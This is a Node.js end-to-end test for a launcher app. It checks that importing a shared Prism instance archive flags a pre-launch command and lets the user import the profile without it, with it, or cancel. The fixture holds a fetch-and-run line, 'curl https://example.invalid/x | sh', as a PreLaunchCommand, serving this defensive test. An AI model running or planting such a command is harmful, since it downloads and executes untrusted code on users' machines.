// Importing a Prism instance (.zip) that would run programs when it starts:
// the window lists those settings before importing it, and the profile is
// imported without them, with them, or not at all.
//   xvfb-run -a -s "-screen 0 1920x1080x24" node scripts/e2e-import-settings.mjs [outDir]
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFileSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
const { _electron: electron } = require('playwright');
const { writeZip } = require('../src/main/util/zip');
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const out = path.resolve(process.argv[2] || path.join(os.tmpdir(), 'havihub-import-settings'));
fs.mkdirSync(out, { recursive: true });
let failed = 0;
const check = (name, ok, extra = '') => {
  console.log(`${ok ? 'ok  ' : 'FAIL'} ${name}${extra ? '  ' + extra : ''}`);
  if (!ok) failed++;
};

const work = fs.mkdtempSync(path.join(os.tmpdir(), 'havihub-import-settings-'));
const data = path.join(work, 'PrismLauncher');
execFileSync(process.execPath, [path.join(root, 'scripts/make-fixtures.mjs'), data]);
fs.mkdirSync(path.join(work, 'userdata'), { recursive: true });
fs.writeFileSync(path.join(work, 'userdata', 'config.json'), JSON.stringify({ closeToTray: false, importPromptDone: true, layout: 'curseforge', themePreset: 'forge' }));

// an instance someone shared, with a command that runs before the game
const archive = path.join(work, 'Shared profile.zip');
const cfg = ['[General]', 'ConfigVersion=1.3', 'InstanceType=OneSix', 'name=Shared profile', 'OverrideCommands=true', 'PreLaunchCommand=curl https://example.invalid/x | sh', 'OverrideMemory=true', 'MaxMemAlloc=4096'].join('\n');
await writeZip(archive, [
  { name: 'Shared profile/instance.cfg', buffer: Buffer.from(cfg) },
  { name: 'Shared profile/mmc-pack.json', buffer: Buffer.from(JSON.stringify({ formatVersion: 1, components: [{ uid: 'net.minecraft', version: '26.2', important: true }] })) },
]);

const app = await electron.launch({
  executablePath: require('electron'),
  args: [path.join(root, 'dist/main.js'), '--no-sandbox', '--lang=es-CL', '--use-angle=swiftshader', '--enable-unsafe-swiftshader'],
  env: { ...process.env, HAVIHUB_USER_DATA: path.join(work, 'userdata'), HAVIHUB_PRISM_DIR: data, HAVIHUB_PRISM_EXE: path.join(data, 'prismlauncher'), HAVIHUB_MOCK_NET: path.join(root, 'scripts/mock-net.cjs'), HAVIHUB_TEST_CF_KEY: 'test-key' },
});
// the file picker answers with the archive
await app.evaluate(({ dialog }, file) => {
  dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [file] });
}, archive);
const page = await app.firstWindow();
page.setDefaultTimeout(10000);
await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].setSize(1536, 864));
const instanceCfgs = () =>
  fs
    .readdirSync(path.join(data, 'instances'))
    .filter((d) => d.startsWith('Shared profile'))
    .map((d) => fs.readFileSync(path.join(data, 'instances', d, 'instance.cfg'), 'utf8'));
const importIt = async () => {
  await page.locator('.toolbar button', { hasText: 'Importar' }).click();
  await page.locator('.menu-item', { hasText: 'Desde un archivo' }).click();
  await page.waitForSelector('.modal');
};

try {
  await page.waitForSelector('.inst-card, .group-card', { timeout: 20000 });
  await importIt();
  const text = await page.locator('.modal').innerText();
  check('the dialog names the command it found', /PreLaunchCommand/.test(text) && /example\.invalid/.test(text));
  await page.screenshot({ path: path.join(out, 'import-settings.png') });

  await page.locator('.modal button', { hasText: 'Cancelar' }).click();
  await page.waitForTimeout(800);
  check('"Cancelar" imports nothing', instanceCfgs().length === 0);

  await importIt();
  await page.locator('.modal button', { hasText: 'Importar sin ellos' }).click();
  await page.waitForTimeout(2500);
  let cfgs = instanceCfgs();
  check('"Importar sin ellos" imports the profile without the command', cfgs.length === 1 && !/PreLaunchCommand/.test(cfgs[0]) && /MaxMemAlloc=4096/.test(cfgs[0]));

  // the import opens the new profile: back to "Mis modpacks"
  await page.locator('.top-tab', { hasText: 'Mis modpacks' }).click();
  await page.waitForSelector('.toolbar');
  await importIt();
  await page.locator('.modal button', { hasText: 'Importar con ellos' }).click();
  await page.waitForTimeout(2500);
  cfgs = instanceCfgs();
  check('"Importar con ellos" keeps the command', cfgs.length === 2 && cfgs.some((c) => /PreLaunchCommand=curl/.test(c)));
} catch (e) {
  console.error('FAILED', e.message.slice(0, 800));
  await page.screenshot({ path: path.join(out, 'import-settings-failed.png') }).catch(() => {});
  failed++;
}
await app.close().catch(() => {});
fs.rmSync(work, { recursive: true, force: true });
console.log(failed ? `${failed} failed` : 'all passed');
process.exit(failed ? 1 : 0);
